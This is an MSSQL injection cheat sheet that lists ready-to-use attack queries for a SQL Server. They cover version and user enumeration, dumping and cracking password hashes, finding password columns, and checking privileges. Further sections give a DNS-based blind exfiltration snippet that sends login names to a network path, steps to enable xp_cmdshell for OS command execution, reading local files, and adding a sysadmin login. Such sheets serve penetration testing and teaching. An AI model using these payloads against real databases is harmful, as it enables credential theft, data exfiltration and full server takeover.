# ✅ MSSQL Injection Cheat Sheet

---

## 📚 References

- [Oracle](http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/)
- [MSSQL](http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/)
- [MySQL](http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/)
- [PostgreSQL](http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/)
- [Ingres](http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/)
- [DB2](http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/)
- [Informix](http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/)
- [MS Access](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

---

## 🔎 Enumeration

### Version
```sql
SELECT @@version;
```

### Current User
```sql
SELECT user_name();
SELECT system_user;
SELECT user;
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID;
```

### List Users
```sql
SELECT name FROM master..syslogins;
```

### Password Hashes (Privileged)
```sql
-- MSSQL 2000
SELECT name, password FROM master..sysxlogins;
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins;

-- MSSQL 2005+
SELECT name, password_hash FROM master.sys.sql_logins;
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins;
```

### Crack Hashes
MSSQL 2000 & 2005 use SHA1 — try:  
https://labs.portcullis.co.uk/application/phrasen-drescher/

### Current Database
```sql
SELECT DB_NAME();
```

### List Databases
```sql
SELECT name FROM master..sysdatabases;
SELECT DB_NAME(N); -- Where N = 0, 1, 2...
```

### List Tables
```sql
SELECT name FROM master..sysobjects WHERE xtype = 'U'; -- tables
SELECT name FROM master..sysobjects WHERE xtype = 'V'; -- views
```

### List Columns (in table)
```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');
```

### Find Tables by Column Name
```sql
SELECT sysobjects.name AS tablename, syscolumns.name AS columnname
FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id
WHERE sysobjects.xtype = 'U' AND syscolumns.name LIKE '%PASSWORD%';
```

### Hostname/IP
```sql
SELECT HOST_NAME();
```

---

## 🔐 Privilege Info

### Check Current Permissions
```sql
SELECT permission_name FROM fn_my_permissions(NULL, 'DATABASE');
SELECT permission_name FROM fn_my_permissions(NULL, 'SERVER');
SELECT permission_name FROM fn_my_permissions('master..syslogins', 'OBJECT');
SELECT permission_name FROM fn_my_permissions('sa', 'USER');
```

### Check Server Roles
```sql
SELECT is_srvrolemember('sysadmin');
SELECT is_srvrolemember('dbcreator');
-- repeat for bulkadmin, diskadmin, etc.
```

### List Users With Specific Roles
```sql
SELECT name FROM master..syslogins WHERE sysadmin = 1;
SELECT name FROM master..syslogins WHERE serveradmin = 1;
-- repeat for other roles...
```

---

## 🧪 Functions and Tricks

### Select Nth Row
```sql
SELECT TOP 1 name
FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq
ORDER BY name DESC;
```

### Select Nth Char
```sql
SELECT SUBSTRING('abcd', 3, 1); -- returns 'c'
```

### Bitwise Ops
```sql
SELECT 6 & 2; -- returns 2
SELECT 6 & 1; -- returns 0
```

### ASCII/Char Conversion
```sql
SELECT CHAR(0x41); -- returns 'A'
SELECT ASCII('A'); -- returns 65
```

### Casting
```sql
SELECT CAST('1' AS int);
SELECT CAST(1 AS char);
```

### String Concat / Avoiding Quotes
```sql
SELECT 'A' + 'B'; -- AB
SELECT CHAR(65) + CHAR(66); -- AB
```

### Conditionals
```sql
IF (1=1) SELECT 1 ELSE SELECT 2;
SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;
```

---

## ⏱ Delays & Exfil

### Time Delay
```sql
WAITFOR DELAY '0:0:5';
```

### Make DNS Requests (Blind exfil)
```sql
DECLARE @host VARCHAR(800);
SELECT @host = name FROM master..syslogins;
EXEC('master..xp_getfiledetails "\' + @host + 'c$\boot.ini"');
```

---

## ⚙️ System-Level Access (Privileged)

### Command Execution
```sql
EXEC xp_cmdshell 'net user';

-- If disabled (2005+):
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### Local File Access
```sql
CREATE TABLE mydata (line VARCHAR(8000));
BULK INSERT mydata FROM 'C:\boot.ini';
DROP TABLE mydata;
```

### Create Users / Grant Privileges
```sql
EXEC sp_addlogin 'user', 'pass';
EXEC sp_addsrvrolemember 'user', 'sysadmin';
```

### Drop User
```sql
EXEC sp_droplogin 'user';
```

### Locate DB Files
```sql
EXEC sp_helpdb master;
EXEC sp_helpdb pubs;
```

---

## 🧰 Default/System DBs
- northwind
- model
- msdb
- pubs *(Not on SQL 2005)*
- tempdb